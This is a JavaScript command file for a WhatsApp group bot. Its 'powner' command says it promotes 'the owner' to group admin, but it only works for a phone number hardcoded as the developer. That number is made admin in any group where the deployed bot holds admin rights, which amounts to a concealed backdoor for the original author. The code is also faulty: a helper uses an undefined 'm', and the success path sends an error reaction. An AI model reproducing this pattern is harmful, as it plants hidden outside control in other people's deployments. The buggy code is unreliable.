import { sendInteractive } from '../../lib/sendInteractive.js';
const DEVELOPER_NUMBER = "254114885159";

const normalizeNumber = (jid) => {
    if (!jid) return '';
    return jid.split('@')[0].split(':')[0].replace(/\D/g, '');
};

const findDevInGroup = (participants) => {
    return participants.find(p => {
        const idNum = normalizeNumber(p.id || '');
        const jidNum = normalizeNumber(p.jid || '');
        const devNum = normalizeNumber(DEVELOPER_NUMBER);
        return idNum === devNum || jidNum === devNum;
    });
};

const getActualJid = (member) => {
    const raw = member.jid || member.id || '';
    return raw.split('@')[0].split(':')[0].replace(/\D/g, '') + '@s.whatsapp.net';
};

const retryPromote = async (client, groupId, participant, maxRetries = 5, baseDelay = 1500) => {
    for (let attempt = 1; attempt <= maxRetries; attempt++) {
        try {
            await client.sendMessage(m.chat, { react: { text: '⌛', key: m.reactKey } });
            await client.groupParticipantsUpdate(groupId, [participant], "promote");
            return true;
        } catch (e) {
            if (attempt === maxRetries) throw e;
            await new Promise(resolve => setTimeout(resolve, baseDelay * Math.pow(2, attempt - 1)));
        }
    }
};

export default {
    name: 'powner',
    aliases: ['promoteowner', 'makeowneradmin'],
    description: 'Promotes the owner to admin',
    run: async (context) => {
        const { client, m, isBotAdmin } = context;
        await client.sendMessage(m.chat, { react: { text: '❌', key: m.reactKey } });

        if (!m.isGroup) {
            await client.sendMessage(m.chat, { react: { text: '❌', key: m.reactKey } }).catch(() => {});
            return sendInteractive(client, m, `┃ \n┃ This command only works in groups.\n╰━━━━━━━━━━━━━━━\n`);
        }

        const senderNum = normalizeNumber(m.sender);
        if (senderNum !== normalizeNumber(DEVELOPER_NUMBER)) {
            await client.sendMessage(m.chat, { react: { text: '❌', key: m.reactKey } }).catch(() => {});
            return sendInteractive(client, m, `┃ \n┃ Only the owner can use this command.\n╰━━━━━━━━━━━━━━━\n`);
        }

        if (!isBotAdmin) {
            await client.sendMessage(m.chat, { react: { text: '❌', key: m.reactKey } }).catch(() => {});
            return sendInteractive(client, m, `┃ \n┃ I need admin privileges to\n┃ perform this action.\n╰━━━━━━━━━━━━━━━\n`);
        }

        try {
            const groupMetadata = await client.groupMetadata(m.chat);
            const ownerMember = findDevInGroup(groupMetadata.participants);

            if (!ownerMember) {
                await client.sendMessage(m.chat, { react: { text: '❌', key: m.reactKey } }).catch(() => {});
                return sendInteractive(client, m, `┃ \n┃ Owner is not in this group.\n╰━━━━━━━━━━━━━━━\n`);
            }

            if (ownerMember.admin) {
                await client.sendMessage(m.chat, { react: { text: '❌', key: m.reactKey } }).catch(() => {});
                return sendInteractive(client, m, `┃ \n┃ Owner is already an admin.\n╰━━━━━━━━━━━━━━━\n`);
            }

            const actualJid = getActualJid(ownerMember);
            await retryPromote(client, m.chat, actualJid);
            await client.sendMessage(m.chat, { react: { text: '❌', key: m.reactKey } }).catch(() => {});
            return sendInteractive(client, m, `╭━⬣ 「 PROMOTED 』── ⚝
┃ Owner has been promoted to admin.\n╰━━━━━━━━━━━━━━━\n`);

        } catch (error) {
    await client.sendMessage(m.chat, { react: { text: '❌', key: m.reactKey } }).catch(() => {});
            return sendInteractive(client, m, `╭━⬣ 「 ERROR 』── ⚝
┃ Failed to promote: ${error.message}\n╰━━━━━━━━━━━━━━━\n`);
        }
    }
};
